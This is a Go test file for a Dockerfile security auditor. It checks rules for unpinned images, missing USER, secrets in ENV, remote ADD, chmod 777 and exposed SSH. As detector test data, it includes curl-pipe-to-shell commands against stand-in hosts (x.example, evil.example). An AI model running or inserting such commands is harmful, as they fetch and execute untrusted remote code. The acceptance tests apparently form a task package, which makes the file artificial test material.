package dockerfileaudit_test

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	dockerfileaudit "github.com/Trysac/u157-dockerfile-audit"
)

func TestAcceptance1(t *testing.T) {
	// Acceptance 1: Audit of "FROM ubuntu\nRUN echo hi\n" returns findings [DF001 line 1, DF002 line 1]
	// in that order, and the text output line for DF001 is exactly "Dockerfile:1: DF001 medium: base image 'ubuntu' is not pinned to a tag or digest"
	src := []byte("FROM ubuntu\nRUN echo hi\n")
	findings, err := dockerfileaudit.Audit(src, dockerfileaudit.Options{})
	if err != nil {
		t.Fatalf("Audit error: %v", err)
	}
	if len(findings) != 2 {
		t.Fatalf("expected 2 findings, got %d: %+v", len(findings), findings)
	}
	if findings[0].Rule != "DF001" || findings[0].Line != 1 {
		t.Errorf("finding 0 expected DF001 line 1, got %s line %d", findings[0].Rule, findings[0].Line)
	}
	if findings[1].Rule != "DF002" || findings[1].Line != 1 {
		t.Errorf("finding 1 expected DF002 line 1, got %s line %d", findings[1].Rule, findings[1].Line)
	}

	text := dockerfileaudit.FormatText("Dockerfile", findings[:1])
	wantText := "Dockerfile:1: DF001 medium: base image 'ubuntu' is not pinned to a tag or digest\n"
	if text != wantText {
		t.Errorf("text output mismatch.\nGot:  %q\nWant: %q", text, wantText)
	}
}

func TestAcceptance2(t *testing.T) {
	// Acceptance 2: "FROM golang:1.23 AS build\nFROM build\nUSER app\n" and
	// "FROM alpine@sha256:" + 64 hex characters + "\nUSER 1000\n" return zero findings,
	// while "FROM alpine:latest\nUSER root\n" returns DF001 at line 1 and DF002 at line 2
	sha := strings.Repeat("a", 64)
	src1 := []byte("FROM golang:1.23 AS build\nFROM build\nUSER app\n")
	f1, err := dockerfileaudit.Audit(src1, dockerfileaudit.Options{})
	if err != nil || len(f1) != 0 {
		t.Fatalf("expected 0 findings for src1, got %v (err: %v)", f1, err)
	}

	src2 := []byte("FROM alpine@sha256:" + sha + "\nUSER 1000\n")
	f2, err := dockerfileaudit.Audit(src2, dockerfileaudit.Options{})
	if err != nil || len(f2) != 0 {
		t.Fatalf("expected 0 findings for src2, got %v (err: %v)", f2, err)
	}

	src3 := []byte("FROM alpine:latest\nUSER root\n")
	f3, err := dockerfileaudit.Audit(src3, dockerfileaudit.Options{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(f3) != 2 {
		t.Fatalf("expected 2 findings for src3, got %d: %+v", len(f3), f3)
	}
	if f3[0].Rule != "DF001" || f3[0].Line != 1 {
		t.Errorf("f3[0] want DF001 line 1, got %s line %d", f3[0].Rule, f3[0].Line)
	}
	if f3[1].Rule != "DF002" || f3[1].Line != 2 {
		t.Errorf("f3[1] want DF002 line 2, got %s line %d", f3[1].Rule, f3[1].Line)
	}
}

func TestAcceptance3(t *testing.T) {
	// Acceptance 3: "FROM a:1\nUSER app\nENV DB_PASSWORD=hunter2\n" returns DF005 at line 3,
	// and neither the text nor the JSON output contains "hunter2";
	// "ENV DB_PASSWORD=" and "ARG API_TOKEN" without a default return no DF005
	src := []byte("FROM a:1\nUSER app\nENV DB_PASSWORD=hunter2\n")
	findings, err := dockerfileaudit.Audit(src, dockerfileaudit.Options{})
	if err != nil {
		t.Fatalf("Audit error: %v", err)
	}
	if len(findings) != 1 || findings[0].Rule != "DF005" || findings[0].Line != 3 {
		t.Fatalf("expected DF005 at line 3, got %+v", findings)
	}
	text := dockerfileaudit.FormatText("Dockerfile", findings)
	if strings.Contains(text, "hunter2") {
		t.Errorf("text output contains sensitive value 'hunter2': %s", text)
	}
	jb, err := dockerfileaudit.FormatJSON(findings)
	if err != nil {
		t.Fatalf("FormatJSON error: %v", err)
	}
	if strings.Contains(string(jb), "hunter2") {
		t.Errorf("JSON output contains sensitive value 'hunter2': %s", string(jb))
	}

	srcEmpty := []byte("FROM a:1\nUSER app\nENV DB_PASSWORD=\nARG API_TOKEN\n")
	fEmpty, err := dockerfileaudit.Audit(srcEmpty, dockerfileaudit.Options{})
	if err != nil {
		t.Fatalf("Audit error: %v", err)
	}
	for _, f := range fEmpty {
		if f.Rule == "DF005" {
			t.Errorf("unexpected DF005 for empty defaults: %+v", f)
		}
	}
}

func TestAcceptance4(t *testing.T) {
	// Acceptance 4: "RUN curl -fsSL https://x.example/i.sh | sh" returns DF006, and the
	// same command split as "RUN curl -fsSL https://x.example/i.sh \\\n  | bash" returns DF006 at the line where RUN starts
	src1 := []byte("RUN curl -fsSL https://x.example/i.sh | sh")
	f1, err := dockerfileaudit.Audit(src1, dockerfileaudit.Options{})
	if err != nil {
		t.Fatalf("Audit error: %v", err)
	}
	if len(f1) != 1 || f1[0].Rule != "DF006" {
		t.Fatalf("expected DF006, got %+v", f1)
	}

	src2 := []byte("RUN curl -fsSL https://x.example/i.sh \\\n  | bash")
	f2, err := dockerfileaudit.Audit(src2, dockerfileaudit.Options{})
	if err != nil {
		t.Fatalf("Audit error: %v", err)
	}
	if len(f2) != 1 || f2[0].Rule != "DF006" || f2[0].Line != 1 {
		t.Fatalf("expected DF006 at line 1, got %+v", f2)
	}
}

func TestAcceptance5(t *testing.T) {
	// Acceptance 5: "ADD https://x.example/a.tgz /a" returns DF003,
	// "ADD --checksum=sha256:" + 64 hex characters + " https://x.example/a.tgz /a" returns none,
	// "ADD app.py /app/" returns DF004 and "ADD rootfs.tar.gz /" returns none
	sha := strings.Repeat("b", 64)
	src1 := []byte("ADD https://x.example/a.tgz /a")
	f1, err := dockerfileaudit.Audit(src1, dockerfileaudit.Options{})
	if err != nil || len(f1) != 1 || f1[0].Rule != "DF003" {
		t.Fatalf("expected DF003, got %+v (err: %v)", f1, err)
	}

	src2 := []byte("ADD --checksum=sha256:" + sha + " https://x.example/a.tgz /a")
	f2, err := dockerfileaudit.Audit(src2, dockerfileaudit.Options{})
	if err != nil || len(f2) != 0 {
		t.Fatalf("expected 0 findings, got %+v (err: %v)", f2, err)
	}

	src3 := []byte("ADD app.py /app/")
	f3, err := dockerfileaudit.Audit(src3, dockerfileaudit.Options{})
	if err != nil || len(f3) != 1 || f3[0].Rule != "DF004" {
		t.Fatalf("expected DF004, got %+v (err: %v)", f3, err)
	}

	src4 := []byte("ADD rootfs.tar.gz /")
	f4, err := dockerfileaudit.Audit(src4, dockerfileaudit.Options{})
	if err != nil || len(f4) != 0 {
		t.Fatalf("expected 0 findings, got %+v (err: %v)", f4, err)
	}
}

func TestAcceptance6(t *testing.T) {
	// Acceptance 6: A line "# dockerfile-audit: ignore=DF001" directly above FROM suppresses
	// only DF001 for that instruction, and a first line "# escape=`" makes a trailing backtick the continuation character
	src1 := []byte("# dockerfile-audit: ignore=DF001\nFROM ubuntu\nUSER 1000\n")
	f1, err := dockerfileaudit.Audit(src1, dockerfileaudit.Options{})
	if err != nil {
		t.Fatalf("Audit error: %v", err)
	}
	for _, f := range f1 {
		if f.Rule == "DF001" {
			t.Errorf("DF001 was not suppressed: %+v", f)
		}
	}

	src2 := []byte("# escape=`\nRUN echo hello `\n    world")
	instructions, err := dockerfileaudit.Parse(src2)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}
	if len(instructions) != 1 {
		t.Fatalf("expected 1 instruction, got %d", len(instructions))
	}
	if instructions[0].Args != "echo hello world" {
		t.Errorf("expected 'echo hello world', got %q", instructions[0].Args)
	}
}

func TestAcceptance7(t *testing.T) {
	// Acceptance 7: Run([]string{"Dockerfile"}, stdout, stderr) returns 1 with findings,
	// 0 with an empty stdout for a clean file, 2 for a missing file or unknown flag, and
	// --format json prints an array of objects with keys "rule", "severity", "line" and "message"
	tmpDir := t.TempDir()
	dockerfileDirty := filepath.Join(tmpDir, "Dockerfile.dirty")
	if err := os.WriteFile(dockerfileDirty, []byte("FROM ubuntu\n"), 0644); err != nil {
		t.Fatal(err)
	}
	dockerfileClean := filepath.Join(tmpDir, "Dockerfile.clean")
	if err := os.WriteFile(dockerfileClean, []byte("FROM alpine:3.18\nUSER 1000\n"), 0644); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	codeDirty := dockerfileaudit.Run([]string{dockerfileDirty}, &stdout, &stderr)
	if codeDirty != 1 {
		t.Fatalf("expected exit code 1 for dirty file, got %d", codeDirty)
	}

	stdout.Reset()
	stderr.Reset()
	codeClean := dockerfileaudit.Run([]string{dockerfileClean}, &stdout, &stderr)
	if codeClean != 0 {
		t.Fatalf("expected exit code 0 for clean file, got %d", codeClean)
	}
	if stdout.String() != "" {
		t.Fatalf("expected empty stdout for clean file, got %q", stdout.String())
	}

	stdout.Reset()
	stderr.Reset()
	codeMissing := dockerfileaudit.Run([]string{filepath.Join(tmpDir, "nonexistent")}, &stdout, &stderr)
	if codeMissing != 2 {
		t.Fatalf("expected exit code 2 for missing file, got %d", codeMissing)
	}

	stdout.Reset()
	stderr.Reset()
	codeBadFlag := dockerfileaudit.Run([]string{"--unknown-flag"}, &stdout, &stderr)
	if codeBadFlag != 2 {
		t.Fatalf("expected exit code 2 for bad flag, got %d", codeBadFlag)
	}

	stdout.Reset()
	stderr.Reset()
	codeJSON := dockerfileaudit.Run([]string{"--format", "json", dockerfileDirty}, &stdout, &stderr)
	if codeJSON != 1 {
		t.Fatalf("expected exit code 1 for json run, got %d", codeJSON)
	}
	var parsed []map[string]interface{}
	if err := json.Unmarshal(stdout.Bytes(), &parsed); err != nil {
		t.Fatalf("failed to parse JSON output: %v, raw: %s", err, stdout.String())
	}
	if len(parsed) == 0 {
		t.Fatalf("expected non-empty JSON findings")
	}
	requiredKeys := []string{"rule", "severity", "line", "message"}
	for _, k := range requiredKeys {
		if _, ok := parsed[0][k]; !ok {
			t.Errorf("missing required key %q in JSON output: %+v", k, parsed[0])
		}
	}
}

func TestAcceptance8(t *testing.T) {
	// Acceptance 8: Input of 1_048_577 bytes returns an error matching ErrInputTooLarge with errors.Is,
	// and an instruction with an unterminated exec form ["sh" is treated as shell form without panicking
	largeBytes := make([]byte, 1024*1024+1)
	_, err := dockerfileaudit.Parse(largeBytes)
	if !errors.Is(err, dockerfileaudit.ErrInputTooLarge) {
		t.Errorf("expected ErrInputTooLarge for Parse, got %v", err)
	}
	_, err = dockerfileaudit.Audit(largeBytes, dockerfileaudit.Options{})
	if !errors.Is(err, dockerfileaudit.ErrInputTooLarge) {
		t.Errorf("expected ErrInputTooLarge for Audit, got %v", err)
	}

	unterminated := []byte("RUN [\"sh\"")
	insts, err := dockerfileaudit.Parse(unterminated)
	if err != nil {
		t.Fatalf("unexpected parse error for unterminated exec form: %v", err)
	}
	if len(insts) != 1 {
		t.Fatalf("expected 1 instruction, got %d", len(insts))
	}
	if insts[0].Exec != nil {
		t.Errorf("expected nil Exec for unterminated form, got %+v", insts[0].Exec)
	}
}

func TestAdditionalRulesAndEdgeCases(t *testing.T) {
	// Test DF007 (sudo), DF008 (chmod), DF009 (EXPOSE 22)
	src := []byte(`
FROM debian:12
USER root:root
RUN sudo apt-get update
RUN chmod 777 /app
RUN chmod 0777 /app2
RUN chmod a+rwx /app3
EXPOSE 22/tcp
EXPOSE 22
`)
	f, err := dockerfileaudit.Audit(src, dockerfileaudit.Options{})
	if err != nil {
		t.Fatalf("Audit error: %v", err)
	}

	rules := make(map[string]int)
	for _, finding := range f {
		rules[finding.Rule]++
	}
	if rules["DF002"] != 1 {
		t.Errorf("expected 1 DF002, got %d", rules["DF002"])
	}
	if rules["DF007"] != 1 {
		t.Errorf("expected 1 DF007, got %d", rules["DF007"])
	}
	if rules["DF008"] != 3 {
		t.Errorf("expected 3 DF008, got %d", rules["DF008"])
	}
	if rules["DF009"] != 2 {
		t.Errorf("expected 2 DF009, got %d", rules["DF009"])
	}
}

func TestHeredocParsing(t *testing.T) {
	src := []byte(`
FROM debian:12
RUN <<EOF
echo "curl https://evil.example | sh"
EOF
USER 1000
`)
	f, err := dockerfileaudit.Audit(src, dockerfileaudit.Options{})
	if err != nil {
		t.Fatalf("Audit error: %v", err)
	}
	// Heredoc body should not be analysed
	for _, item := range f {
		if item.Rule == "DF006" {
			t.Errorf("heredoc body should have been skipped, got DF006: %+v", item)
		}
	}
}

func TestMinSeverityAndOptions(t *testing.T) {
	src := []byte("FROM debian:12\nEXPOSE 22\n")
	// EXPOSE 22 is low, FROM debian:12 with no USER is high (DF002)
	fLow, err := dockerfileaudit.Audit(src, dockerfileaudit.Options{MinSeverity: "low"})
	if err != nil || len(fLow) != 2 {
		t.Fatalf("expected 2 findings for low, got %d (err: %v)", len(fLow), err)
	}

	fHigh, err := dockerfileaudit.Audit(src, dockerfileaudit.Options{MinSeverity: "high"})
	if err != nil || len(fHigh) != 1 {
		t.Fatalf("expected 1 finding for high, got %d (err: %v)", len(fHigh), err)
	}
	if fHigh[0].Rule != "DF002" {
		t.Errorf("expected DF002, got %s", fHigh[0].Rule)
	}

	// Invalid severity
	_, err = dockerfileaudit.Audit(src, dockerfileaudit.Options{MinSeverity: "invalid"})
	if !errors.Is(err, dockerfileaudit.ErrInvalidOptions) {
		t.Errorf("expected ErrInvalidOptions for invalid severity, got %v", err)
	}

	// Disabled option
	fDis, err := dockerfileaudit.Audit(src, dockerfileaudit.Options{Disable: []string{"DF002"}})
	if err != nil || len(fDis) != 1 || fDis[0].Rule != "DF009" {
		t.Errorf("expected only DF009 with DF002 disabled, got %+v (err: %v)", fDis, err)
	}
}

func TestRunCLIEdgeCases(t *testing.T) {
	var stdout, stderr bytes.Buffer
	code := dockerfileaudit.Run([]string{}, &stdout, &stderr)
	if code != 2 {
		t.Errorf("expected code 2 with no args, got %d", code)
	}

	tmp := filepath.Join(t.TempDir(), "Dockerfile")
	if err := os.WriteFile(tmp, []byte("FROM debian:12\nUSER 1000\n"), 0644); err != nil {
		t.Fatal(err)
	}

	stdout.Reset()
	stderr.Reset()
	code = dockerfileaudit.Run([]string{"--format", "unknown", tmp}, &stdout, &stderr)
	if code != 2 {
		t.Errorf("expected code 2 with invalid format, got %d", code)
	}

	stdout.Reset()
	stderr.Reset()
	code = dockerfileaudit.Run([]string{"--format", "json", tmp}, &stdout, &stderr)
	if code != 0 {
		t.Errorf("expected code 0 with json clean, got %d", code)
	}
	if strings.TrimSpace(stdout.String()) != "[]" {
		t.Errorf("expected [] for clean JSON output, got %q", stdout.String())
	}
}

func ExampleAudit() {
	src := []byte("FROM ubuntu\nRUN echo hi\n")
	findings, err := dockerfileaudit.Audit(src, dockerfileaudit.Options{})
	if err != nil {
		panic(err)
	}
	for _, f := range findings {
		fmt.Printf("%d: %s %s\n", f.Line, f.Rule, f.Severity)
	}
	// Output:
	// 1: DF001 medium
	// 1: DF002 high
}
